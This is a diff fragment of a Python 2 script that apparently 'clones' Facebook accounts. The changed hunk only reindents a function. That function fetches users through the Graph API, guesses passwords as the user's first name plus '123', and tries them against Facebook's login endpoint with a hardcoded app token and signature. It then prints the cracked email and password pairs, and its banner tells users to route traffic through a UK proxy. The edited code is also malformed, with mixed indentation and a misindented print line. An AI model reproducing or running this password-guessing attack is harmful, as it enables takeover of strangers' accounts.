@@ -3283,19 +3283,17 @@ def pilih_army():
 	jalan(' \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
         jalan(' \033[1;95m      Plz Conect United Kingdom Proxy ')
 	print "\033[1;97m«--------------------\033[1;92m▣\033[1;97m--------------------»"
-	
-			
 	def main(arg):
-        user = arg
-        try:
-            a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
-            b = json.loads(a.text)
-            # Password Guess 1
-            pass1 = b['first_name'] + '123'
-            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
-            q = json.load(data)
-            if 'access_token' in q:
-                print '\n\x1b[1;95m Email :\x1b[1;97m ' + user + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass1
+		user = arg
+		try:
+			a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
+			b = json.loads(a.text)
+			# Password Guess 1
+			pass1 = b['first_name'] + '123'
+			data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+			q = json.load(data)
+			if 'access_token' in q:
+			print '\n\x1b[1;95m Email :\x1b[1;97m ' + user + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass1
             elif 'www.facebook.com' in q['error_msg']:
                 print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass1
             else:
